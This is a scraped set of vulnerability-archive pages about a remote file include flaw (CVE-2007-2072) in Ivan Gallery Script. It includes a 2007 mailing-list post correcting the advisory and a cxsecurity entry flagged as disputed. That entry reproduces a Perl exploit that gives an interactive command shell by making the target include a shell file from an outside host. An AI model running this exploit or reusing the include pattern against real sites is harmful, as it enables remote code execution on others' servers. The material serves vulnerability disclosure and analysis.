=== Content from cxsecurity.com_4edd4de4_20250126_121438.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_faffbce7_20250126_121439.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from attrition.org_ca7138ee_20250125_215442.html ===

# [VIM] Not Quite: Ivan Gallery Script V.0.1 (index.php) Remote File Include Exploit

**George A. Theall**
theall at tenablesecurity.com

*Tue Apr 17 01:37:31 UTC 2007*

* Previous message: [[VIM] Dup: Gallery 1.2.5 (GALLERY\_BASEDIR) Multiple RFI Vulnerabilities](001558.html)
* Next message: [[VIM] False: Joomla/Mambo Jambook v1.0 beta7 Rfi Vuln.](001535.html)
* **Messages sorted by:**
  [[ date ]](date.html#1534)
  [[ thread ]](thread.html#1534)
  [[ subject ]](subject.html#1534)
  [[ author ]](author.html#1534)

---

```
Bugtraq 23519 is not quite right. It concerns the Gallery script,
included as part of the Simple PHP Scripts project on SourceForge,
<http://sourceforge.net/projects/sphp/.>

The PoC accompanying the BID tries to exploit the flaw via the 'dir'
parameter of the 'index.php' script. Let's have a look, though. Code in
index.php from gallery-0.3.tar.bz2 looks like this:

   $dir = '.';

   session_start();
   if (empty($_SESSION['images']) || isset($_GET['reload']))
   {
     session_destroy();
     session_start();
   ...
   if (!empty($_REQUEST['gallery']))
     $_SESSION['gallery'] = $_REQUEST['gallery'];
   if (!empty($_SESSION['gallery']))
     $dir = $_SESSION['gallery'];
   ...
   if (file_exists($dir.'/gallery.inc.php'))
     include($dir.'/gallery.inc.php');

$dir is initialized early on and the omitted code doesn't offer any
possibility to override it via, say,  some type of register globals
emulation. Yet as should be obvious, there is a file include issue that
can be easily exploited. It's just that an attacker needs to use the
'gallery' request parameter rather than 'dir' and ensure the session is
a new one.

Another problem with the advisory is that the call to file_exists()
above limits the types of remote files that can be included. For
example, something like '[http://www.different-site.com/cmd.txt'](http://www.different-site.com/cmd.txt%27) as used
in the advisory won't fly but something like
'//computername/share/filename' might.

George
--
[theall at tenablesecurity.com](http://www.attrition.org/mailman/listinfo/vim)

```

---

* Previous message: [[VIM] Dup: Gallery 1.2.5 (GALLERY\_BASEDIR) Multiple RFI Vulnerabilities](001558.html)
* Next message: [[VIM] False: Joomla/Mambo Jambook v1.0 beta7 Rfi Vuln.](001535.html)
* **Messages sorted by:**
  [[ date ]](date.html#1534)
  [[ thread ]](thread.html#1534)
  [[ subject ]](subject.html#1534)
  [[ author ]](author.html#1534)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from cxsecurity.com_dc22a10d_20250126_121440.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_9cee0408_20250125_215444.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **WARNING! Fake news / Disputed / BOGUS****Ivan Gallery Script V.0.1 (index.php) Remote File Include Exploit** **2007.04.19** Credit:  **[SekoMirza & HypNosis](https://cxsecurity.com/author/SekoMirza%2B%26amp%3B%2BHypNosis/1/)**  Risk: **High** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-2072](https://cxsecurity.com/cveshow/CVE-2007-2072/ "Click to see CVE-2007-2072")** CWE: **[CWE-Other](https://cxsecurity.com/cwe/CWE-Other "CWE-Other")**  CVSS Base Score: **7.5/10** Impact Subscore: **6.4/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

#!/usr/bin/perl
#
#Ivan Gallery Script V.0.1 (index.php) Remote File Include Exploit
#
#Coded by SekoMirza & HypNosis
#
#Usage: exploit.pl [target] [cmd shell] [shell variable]
#
#Greetings: Sh4dowM4n , PhanTOmOrhcid , Starhack.0rg , CaRaMeL , MBrain! , and all Turkishz Hackerzz
#
#Vulnerable Code: include($dir.'/gallery.inc.php'); in /index.php
#
#Vendor: http://d.turboupload.com/de/1718382/r40k9auhmy.html
use LWP::UserAgent;
$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
if($Path!~/http:/// || $Pathtocmd!~/http:/// || !$cmdv){usage()}
head();
while()
{
print "[shell] $";
while(<STDIN>)
{
$cmd=$\_;
chomp($cmd);
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'index.php?dir='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "nCould Not connectn";
$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[n]/[....]/;
if (!$cmd) {print "nPlease Enter a Commandnn"; $return ="";}
elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
{print "nCould Not Connect to cmd Host or Invalid Command Variablen";exit}
elsif ($return =~/^<br./>.<b>Fatal.error/) {print "nInvalid Command or No Returnnn"}
if($return =~ /(.\*)/)
{
$finreturn = $1;
$finreturn=~ tr/[....]/[n]/;
print "rn$finreturnnr";
last;
}
else {print "[shell] $";}}}last;
sub head()
{
print "n=====================================================================
=======rn";
print " \*Ivan Gallery Script V.0.1 (index.php) Remote File Include Exploit\*rn";
print "=======================================================================
=====rn";
}
sub usage()
{
head();
print " Usage: exploit.pl [target] [cmd shell location] [cmd shell variable]rnn";
print " <Site> - Full path to MXShotcast ex: http://www.site.com/ rn";
print " <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt rn";
print " <cmd variable> - Command variable used in php shell rn";
print "=======================================================================
=====rn";
print " Bug Found by Sek0MirZa rn";
print " www.starhack.org rn";
print "=======================================================================
=====rn";
exit();
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007040087)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top


